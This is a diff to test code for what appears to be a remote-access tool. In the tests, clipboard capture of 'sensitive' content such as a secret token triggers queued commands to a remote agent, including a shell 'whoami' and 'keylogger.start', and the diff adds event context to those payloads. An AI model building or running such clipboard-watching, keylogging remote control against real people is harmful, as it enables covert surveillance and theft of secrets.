@@ -91,17 +91,18 @@ describe('buildCommandPayload', () => {
 			...baseEvent,
 			matches: [{ field: 'text', value: 'secret' }]
 		});
-		expect(payload).toMatchObject({
-			command: 'echo "hello"',
-			meta: {
-				eventId: 'evt-1',
-				triggerId: 'trigger-1',
-				triggerLabel: 'Sensitive clipboard',
-				sequence: 42,
-				matches: [{ field: 'text', value: 'secret' }],
-				content: {
-					format: 'text',
-					text: { value: 'secret token' }
+                expect(payload).toMatchObject({
+                        command: 'echo "hello"',
+                        meta: {
+                                eventId: 'evt-1',
+                                triggerId: 'trigger-1',
+                                triggerLabel: 'Sensitive clipboard',
+                                capturedAt: baseEvent.capturedAt,
+                                sequence: 42,
+                                matches: [{ field: 'text', value: 'secret' }],
+                                content: {
+                                        format: 'text',
+                                        text: { value: 'secret token' }
 				}
 			}
 		});
@@ -117,14 +118,26 @@ describe('executeClipboardTriggerCommandAction', () => {
 	});
 
 	it('queues command when configuration is valid', () => {
-		const success = executeClipboardTriggerCommandAction('agent-1', baseEvent, 'test context');
-		expect(success).toBe(true);
-		expect(queueCommandMock).toHaveBeenCalledWith(
-			'agent-1',
-			{ name: 'shell', payload: { command: 'whoami' } },
-			{ operatorId: undefined }
-		);
-	});
+                const success = executeClipboardTriggerCommandAction('agent-1', baseEvent, 'test context');
+                expect(success).toBe(true);
+                expect(queueCommandMock).toHaveBeenCalledWith(
+                        'agent-1',
+                        {
+                                name: 'shell',
+                                payload: {
+                                        command: 'whoami',
+                                        context: expect.objectContaining({
+                                                eventId: 'evt-1',
+                                                triggerId: 'trigger-1',
+                                                triggerLabel: 'Sensitive clipboard',
+                                                capturedAt: baseEvent.capturedAt,
+                                                sequence: 42
+                                        })
+                                }
+                        },
+                        { operatorId: undefined }
+                );
+        });
 
 	it('returns false when configuration is invalid', () => {
 		const event: ClipboardTriggerEvent = {
@@ -137,16 +150,27 @@ describe('executeClipboardTriggerCommandAction', () => {
 	});
 
 	it('queues keylogger.start command without payload', () => {
-		const event: ClipboardTriggerEvent = {
-			...baseEvent,
-			action: { type: 'command', configuration: { command: 'keylogger.start' } }
-		};
-		const success = executeClipboardTriggerCommandAction('agent-1', event, 'keylogger start');
-		expect(success).toBe(true);
-		expect(queueCommandMock).toHaveBeenCalledWith(
-			'agent-1',
-			{ name: 'keylogger.start', payload: {} },
-			{ operatorId: undefined }
-		);
-	});
+                const event: ClipboardTriggerEvent = {
+                        ...baseEvent,
+                        action: { type: 'command', configuration: { command: 'keylogger.start' } }
+                };
+                const success = executeClipboardTriggerCommandAction('agent-1', event, 'keylogger start');
+                expect(success).toBe(true);
+                expect(queueCommandMock).toHaveBeenCalledWith(
+                        'agent-1',
+                        {
+                                name: 'keylogger.start',
+                                payload: {
+                                        context: expect.objectContaining({
+                                                eventId: 'evt-1',
+                                                triggerId: 'trigger-1',
+                                                triggerLabel: 'Sensitive clipboard',
+                                                capturedAt: baseEvent.capturedAt,
+                                                sequence: 42
+                                        })
+                                }
+                        },
+                        { operatorId: undefined }
+                );
+        });
 });
